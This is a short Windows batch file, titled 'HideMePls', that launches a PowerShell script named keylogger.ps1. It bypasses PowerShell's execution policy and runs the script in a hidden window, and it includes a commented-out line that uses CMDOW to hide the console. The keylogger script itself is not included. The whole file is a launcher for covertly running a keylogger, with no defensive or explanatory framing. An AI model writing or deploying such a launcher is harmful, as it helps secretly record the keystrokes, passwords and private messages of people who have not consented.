@echo off
TITLE HideMePls
::FOR /F %%A IN ('CMDOW ˆ| FIND "HideMePlease"') DO CMDOW %%A /HID
Powershell -noprofile -executionpolicy bypass -file "keylogger.ps1" -WindowStyle hidden
